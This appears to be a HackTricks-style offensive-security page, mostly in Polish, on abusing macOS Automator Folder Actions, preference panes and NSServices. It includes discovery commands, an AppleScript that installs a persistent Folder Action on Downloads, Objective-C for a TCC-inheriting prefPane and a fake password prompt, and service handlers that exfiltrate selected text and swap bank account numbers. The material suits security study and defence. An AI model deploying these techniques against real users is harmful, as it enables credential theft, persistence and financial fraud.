# macOS Automator, Preference Panes & NSServices - Nadużycia

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Podstawowe informacje

**Automator** to wizualne narzędzie automatyzacji macOS. Wykonuje **workflows** (`.workflow` bundles) złożone z **actions** (`.action` bundles). Automator odpowiada także za **Folder Actions**, **Quick Actions** i integrację z **Shortcuts**.

Automator actions są **plugins** ładowanymi do runtime Automatora podczas wykonania workflow. Mogą:
- Wykonywać dowolne shell scripts
- Przetwarzać pliki i dane
- Wchodzić w interakcję z aplikacjami za pomocą AppleScript
- Łańcuchować się, tworząc złożoną automatyzację

### Dlaczego to ma znaczenie

> [!WARNING]
> Automator workflows mogą być **social-engineered** do wykonania — wyglądają jak proste pliki dokumentów. A `.workflow` bundle może zawierać osadzone polecenia shell, które wykonują się podczas uruchomienia workflow. W połączeniu z Folder Actions zapewniają **automatic persistence**, która uruchamia się przy zdarzeniach związanych z plikami.

### Odkrywanie
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Pakiet `.workflow` wygląda dla większości użytkowników jak zwykły plik dokumentu:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Atak: Utrwalenie Folder Actions

Folder Actions automatycznie wykonują workflow, gdy pliki zostaną dodane do monitorowanego folderu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions utrzymują się po ponownym uruchomieniu i wykonują się bezgłośnie. Folder Action na `~/Downloads` oznacza, że **każdy pobrany plik uruchamia Twój payload** — w tym pliki z Safari, Chrome, AirDrop i załączniki e-mail.

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) to wtyczki ładowane do **System Settings** (dawniej System Preferences). Zapewniają panele UI do konfiguracji funkcji systemowych lub firm trzecich.

### Why This Matters

- Panele preferencji uruchamiane są w obrębie procesu **System Settings**, który może mieć **podwyższone uprawnienia TCC** (accessibility, full disk access w niektórych kontekstach)
- Panele preferencji firm trzecich są ładowane do tego zaufanego procesu, **dziedzicząc jego kontekst bezpieczeństwa**
- Użytkownicy instalują panele preferencji przez **dwukrotne kliknięcie** — łatwy social engineering
- Po zainstalowaniu **utrzymują się** i ładują za każdym razem, gdy System Settings otwiera się na tym panelu

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Atak: Privilege Context Hijacking

Złośliwy panel preferencji dziedziczy kontekst bezpieczeństwa System Settings:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Atak: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Atak: UI Phishing

Panel preferencji może naśladować autentyczne panele UI systemu, aby **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Podstawowe informacje

**NSServices** pozwalają aplikacjom udostępniać funkcje innym aplikacjom za pośrednictwem **menu Usługi** (klik prawym przyciskiem → Usługi). Gdy użytkownik zaznaczy tekst lub dane i wywoła usługę, zaznaczone dane są **wysyłane do dostawcy usługi** w celu przetworzenia.

Usługi są deklarowane w pliku aplikacji `Info.plist` pod kluczem `NSServices` i rejestrowane w pasteboard server (`pbs`).

### Dlaczego to ważne

- Usługi odbierają **przepływ danych między aplikacjami** — zaznaczony tekst z dowolnej aplikacji jest wysyłany do usługi
- Złośliwa usługa może przechwytywać dane z menedżerów haseł, klientów poczty, aplikacji finansowych
- Usługi mogą **zwracać zmodyfikowane dane** do aplikacji wywołującej (man-in-the-middle przy operacjach zaznaczania)
- Nazwy usług mogą być spreparowane, by wyglądać wiarygodnie ("Format Text", "Encrypt Selection", "Share")

### Odkrywanie
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Atak: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Atak: Data Modification (Man-in-the-Middle)

Usługa może **zmodyfikować zwrócone dane** udając, że zapewnia legalną funkcję:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Międzytechnikowe łańcuchy ataków

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel preferencji → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Password Manager Theft
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Odniesienia

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
